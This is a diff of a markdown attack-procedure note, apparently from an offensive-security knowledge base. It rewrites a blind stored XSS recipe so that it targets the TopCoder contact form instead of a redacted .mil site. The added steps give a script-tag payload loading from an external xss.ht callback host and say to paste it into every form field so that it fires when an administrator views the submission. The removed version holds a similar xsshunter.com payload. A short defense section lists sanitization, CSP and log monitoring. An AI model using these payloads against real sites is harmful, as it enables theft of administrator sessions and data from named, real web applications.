@@ -1,107 +1,104 @@
 ---
+id: proc-uuid-5678
 tags:
   - xss
   - stored-xss
-  - blind-xss
   - injection
+  - web
 type: procedure
 tools:
   - '[[tools/XSS-Hunter]]'
 tactics:
   - '[[Initial Access]]'
-  - '[[Execution]]'
 commands: []
 verified: false
 platforms:
   - Web
 submitted: true
-created_at: '2023-10-01T12:00:00Z'
+created_at: '2023-10-01T00:00:00Z'
 techniques:
   - '[[Exploit Public-Facing Application]]'
-  - '[[JavaScript]]'
-updated_at: '2025-12-14T03:47:13.076Z'
+updated_at: '2025-12-14T17:24:56.849Z'
 skill_level: intermediate
 impact_level: high
 detection_risk: low
 sub_techniques: []
-id: 91ef26a1-8952-45ff-a0b4-678251e0c859
 validated: true
 mitre_tactics:
   - '[[Initial Access]]'
-  - '[[Execution]]'
 mitre_techniques:
   - '[[Exploit Public-Facing Application]]'
-  - '[[JavaScript]]'
 ---
 # Inject-Blind-Stored-XSS-Payload-into-Contact-Form
 
 ## Summary
 
-This procedure involves submitting a blind stored XSS payload through a vulnerable contact form on a web application, exploiting improper input sanitization to store executable JavaScript in the backend, which can later be triggered to exfiltrate data when viewed by privileged users like administrators.
+This procedure exploits insufficient input sanitization in web contact form fields to inject a blind stored XSS payload, which is persisted in the backend and awaits execution in an admin context.
 
 ## Description
 
-In this attack scenario, the target is a public-facing contact form on a U.S. Department of Defense website (https://██████.mil/) where fields such as First name, Last name, Company, and Description lack proper HTML encoding or sanitization, allowing injection of angle brackets and script tags. The attacker crafts a payload using an external service like XSS Hunter to detect execution blindly, as no immediate feedback is visible. Once stored, the payload executes in the context of an admin viewing the submission in the /admin panel, leading to data leakage. Prerequisites include public access to the form and an XSS detection service account. Expected outcomes are payload storage and eventual exfiltration of admin session data.
+In scenarios like the TopCoder contact form at https://www.topcoder.com/contact-us/, fields such as First name, Last name, Company, and description fail to sanitize HTML and JavaScript, allowing injection of payloads with angle brackets and script tags. The payload is stored blindly (no immediate feedback) and triggers when an admin views the submission in their backend panel, potentially leaking sensitive data. This targets public-facing web applications with user-submittable forms integrated with admin interfaces.
 
 ## Requirements
 
-1. Web browser with developer tools for payload testing
-2. Public access to the target contact form URL
-3. Account on an XSS Hunter service to generate and monitor payloads
-4. Basic knowledge of JavaScript and HTML injection techniques
+1. Public access to the target website's contact form.
+2. Web browser for form interaction.
+3. XSS Hunter account to generate and host the blind payload.
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Implement strict input sanitization and HTML encoding on all form fields using libraries like DOMPurify
-- Use Content Security Policy (CSP) to block inline scripts and external callbacks
-- Monitor admin panel logs for anomalous JavaScript execution or outbound requests to unknown domains
-- Employ Web Application Firewalls (WAF) to detect and block common XSS payloads
+- Implement server-side input sanitization and output encoding (e.g., using libraries like DOMPurify or OWASP ESAPI).
+- Validate and escape user inputs, rejecting angle brackets and script tags.
+- Use Content Security Policy (CSP) to block inline scripts and external sources.
+- Monitor admin panel logs for anomalous JavaScript execution or outbound requests to unknown domains like xss.ht.
 
 ## Objectives
 
-1. Inject and store a malicious JavaScript payload in the backend database via the contact form
-2. Ensure the payload remains dormant until triggered by admin interaction
-3. Prepare for data exfiltration upon execution to capture sensitive admin information
+1. Persist malicious JavaScript in backend storage via form submission.
+2. Set up conditions for payload execution in privileged admin context.
+3. Enable data exfiltration upon trigger.
 
 ## Instructions
 
-### Step 1: Generate XSS Payload
+### Step 1: Generate Blind XSS Payload
 
-**Context**: Create a blind XSS payload using XSS Hunter to include a callback script that reports execution details without visible effects on the form.
+**Context**: Create a payload using XSS Hunter to beacon back execution details without visible effects.
 
-No command executed; use the XSS Hunter dashboard to generate a payload like `<script src="https://xsshunter.com/payload?id=unique-id"></script>`.
+No command executed; use the XSS Hunter service to generate a payload like `"><script src=https://xvt.xss.ht></script>`. Copy this for form injection.
 
-> This payload loads an external script that beacons back to the service upon execution, capturing context like cookies and IP.
+> This payload closes any open tags and loads an external script that reports to your XSS Hunter instance upon execution.
 
-### Step 2: Submit Payload via Contact Form
+### Step 2: Access and Populate Contact Form
 
-**Context**: Fill and submit the form fields with the payload to exploit the sanitization flaw.
+**Context**: Navigate to the vulnerable form and inject the payload into multiple fields to increase success chances.
 
-No command executed; manually enter the payload into First name, Last name, Company, and Description fields on https://██████.mil/contact, then submit.
+No command executed; browse to https://www.topcoder.com/contact-us/ in a web browser. Fill fields:
+- First name: `"><script src=https://xvt.xss.ht></script>`
+- Last name: Same payload
+- Company: Same payload
+- Description: Same payload, or a longer variant if needed.
 
-> The form processes the input without escaping angle brackets, storing the raw HTML/JS in the backend. Success is indicated by a confirmation message without errors.
+> Ensure the form accepts the input without client-side blocking; test incrementally if validation exists.
 
-### Step 3: Verify Storage (Optional Blind Check)
+### Step 3: Submit the Form
 
-**Context**: If possible, submit a non-malicious test form and check for inconsistencies, but rely on later detection for confirmation.
+**Context**: Persist the payload by submitting, storing it unsanitized in the backend.
 
-No command executed; monitor server responses or use network inspection to ensure no sanitization occurs.
+No command executed; click the submit button and observe the confirmation page.
 
-> Expected: Payload stored intact, no immediate execution.
+> Successful submission indicates storage; the blind nature means no immediate alert.
 
 ## MITRE ATT&CK Mapping
 
 ### Tactics
 
 - [[Initial Access]]
-- [[Execution]]
 
 ### Techniques
 
 - [[Exploit Public-Facing Application]]
-- [[JavaScript]]
 
 ### Sub-Techniques
 
@@ -115,6 +112,6 @@ No command executed; monitor server responses or use network inspection to ensur
 
 ## Tags
 
-- [[xss]]
-- [[stored-xss]]
-- [[blind-xss]]
+- xss
+- injection
+- web
